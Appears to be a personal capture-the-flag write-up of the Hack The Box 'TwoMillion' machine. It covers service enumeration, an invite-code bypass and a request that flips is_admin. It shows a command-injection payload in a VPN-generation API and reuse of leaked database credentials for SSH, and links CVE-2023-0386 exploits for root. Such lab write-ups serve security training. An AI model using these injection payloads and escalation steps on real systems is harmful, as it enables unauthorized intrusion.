
We are in front of a linux pc

The ports open are 22 , 80

The details of the services

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

wappalizer says this :

![[Screenshot_2023-09-10_15_01_38.png]]

whatweb :

```
──(cds㉿kali)-[~/Documents/htb/Twomillion/nmap]
└─$ whatweb http://2million.htb/  
http://2million.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx

```

we have an invite site

![[Screenshot_2023-09-10_15_03_58.png]]

and a log in site

![[Screenshot_2023-09-10_15_03_59.png]]

I'm trying to see if i can see some sub directorys .. or something 

with gobuster
```
gobuster vhost --append-domain -u 2million.htb  -w /home/cds/Downloads/virtual-host-wordlist.txt  --no-error -t 200 --timeout 60s
```

this was the output of gobuster
```
Found: a.ns.emailvision.net..%s.2million.htb Status: 400 [Size: 150]
Found: auhans1.ecompany.ae..%s.2million.htb Status: 400 [Size: 150]
Found: auhans2.ecompany.ae..%s.2million.htb Status: 400 [Size: 150]
Found: ferrari.fortwayne.com..%s.2million.htb Status: 400 [Size: 150]
Found: jordan.fortwayne.com..%s.2million.htb Status: 400 [Size: 150]
Found: m..%s.2million.htb Status: 400 [Size: 150]
Found: ns1.viviotech.net..%s.2million.htb Status: 400 [Size: 150]
Found: ns2.cl.bellsouth.net..%s.2million.htb Status: 400 [Size: 150]
Found: ns2.viviotech.net..%s.2million.htb Status: 400 [Size: 150]
Found: ns3.cl.bellsouth.net..%s.2million.htb Status: 400 [Size: 150]
Found: quatro.oweb.com..%s.2million.htb Status: 400 [Size: 150]
Progress: 556650 / 556651 (100.00%)

```



I try with ffuf too
```
ffuf -u http://10.10.11.221 -H "Host: FUZZ.2million.htb" -w /home/cds/Documents/text-resources/subdomains-top1million-20000.txt -mc all -ac 
```

I cannot see nothing with ffuf, no sub domains but i will try to use a tool called "feroxbuster", this one searchs for directorys and is the first time that im going to use it.



```
feroxbuster -u http://2million.htb
```


http://2million.htb/register



Source code
view-source:http://2million.htb/register?error=Get+an+invite+code+first


Invite api code 

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```




http://2million.htb/api/v1/invite/how/to/generate

POST /api/v1/invite/how/to/generate


```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 Sep 2023 21:08:52 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 249

{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

Result: 

In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate


Code: (base64)
```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 27 Sep 2023 21:14:20 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 91

{"0":200,"success":1,"data":{"code":"V08xNFItTlYxRUwtVlY1REEtMUdBM0g=","format":"encoded"}}
```

```
┌──(cds㉿kali)-[~/Documents/htb/Twomillion/content]
└─$ echo "V08xNFItTlYxRUwtVlY1REEtMUdBM0g=" | base64 -d ; echo                          
WO14R-NV1EL-VV5DA-1GA3H
```

Registration

```
POST /api/v1/user/register HTTP/1.1
Host: 2million.htb
Content-Length: 90
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://2million.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/register
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=3dmedl38f59vcfad216dtcbk9u
Connection: close

code=WO14R-NV1EL-VV5DA-1GA3H&username=test&email=test%40test.com&password=password&password_confirmation=password
```


API OPTIONS
```
{
    "v1": {
        "user": {
            "GET": {
                "\/api\/v1": "Route List",
                "\/api\/v1\/invite\/how\/to\/generate": "Instructions on invite code generation",
                "\/api\/v1\/invite\/generate": "Generate invite code",
                "\/api\/v1\/invite\/verify": "Verify invite code",
                "\/api\/v1\/user\/auth": "Check if user is authenticated",
                "\/api\/v1\/user\/vpn\/generate": "Generate a new VPN configuration",
                "\/api\/v1\/user\/vpn\/regenerate": "Regenerate VPN configuration",
                "\/api\/v1\/user\/vpn\/download": "Download OVPN file"
            },
            "POST": {
                "\/api\/v1\/user\/register": "Register a new user",
                "\/api\/v1\/user\/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "\/api\/v1\/admin\/auth": "Check if user is admin"
            },
            "POST": {
                "\/api\/v1\/admin\/vpn\/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "\/api\/v1\/admin\/settings\/update": "Update user settings"
            }
        }
    }
}
```

I'm logged in ? 

```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 28 Sep 2023 16:13:01 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 48

{"loggedin":true,"username":"test","is_admin":0}
```


How do i get admin ?

```
REQUEST

PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=59lqbcc40a179abo6041fobaao
Connection: close
Content-Length: 80
Content-Type: application/json

{
"email":"test@test.com",
"loggedin":true,"username":"test","is_admin":1}

RESPONSE

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 28 Sep 2023 17:11:14 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40

{"id":14,"username":"test","is_admin":1}

```



VULNERABILITY 

Command Injection

INPUT
```


POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=59lqbcc40a179abo6041fobaao
Connection: close
Content-Type:application/json
Content-Length: 37

{"username":"test ; ls #"

     }

```
OUTPUT
```
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 28 Sep 2023 19:43:49 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 83

Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views

```

credentials .env

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Connect via ssh

user flag

2f5869152c15e6e0013c012f007099b0


active ports 
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                          
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -   
```


Linpeas

CVE-2023-0386


```
You can write SUID file: /tmp/CVE-2023-0386/ovlcap/lower/file
You can write SUID file: /tmp/CVE-2023-0386/ovlcap/upper/file
```

A flaw was found in the Linux kernel, where unauthorized access to the execution of the setuid file with capabilities was found in the Linux kernel’s OverlayFS subsystem in how a user copies a capable file from a nosuid mount into another mount. This uid mapping bug allows a local user to escalate their privileges on the system.

## [Introduction](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#introduction)

On March 22, 2023, a vulnerability in the Linux kernel was publicly disclosed. It is a local privilege escalation vulnerability, allowing an unprivileged user to escalate their privileges to the root user.

**Key points and observations:**

- January 27, 2023: Vulnerability is [patched](https://github.com/torvalds/linux/commit/4f11ada10d0ad3fd53e2bd67806351de63a4f9c3) on the Linux source tree
- March 22, 2023: Vulnerability is publicly disclosed on the NIST NVD as [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- May 4, 2023: Proof-of-concept (PoC) exploits appear on GitHub

The vulnerability, dubbed CVE-2023-0386, is trivial to exploit and applicable to a wide-ranging set of popular Linux distributions and kernel versions. As of May 10, 2023, there has been no observed exploitation in the wild, but due to the existence of open source PoCs, we recommend prioritizing patching.

## [Check if your system is vulnerable](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#check-if-your-system-is-vulnerable)

This vulnerability exclusively affects Linux-based systems. The easiest way to check whether your system is vulnerable is to see which version of the Linux kernel it uses by running the command `uname -r`.

A system is likely to be vulnerable if it has a kernel version lower than 6.2.

For more precise instructions on how to check if a system is vulnerable, you can refer to the advisory specific to your Linux distribution listed in the next section.

https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/


https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/overlayfs-cve-2023-0386



https://github.com/sxlmnwb/CVE-2023-0386

--------------------------------------------------------------------------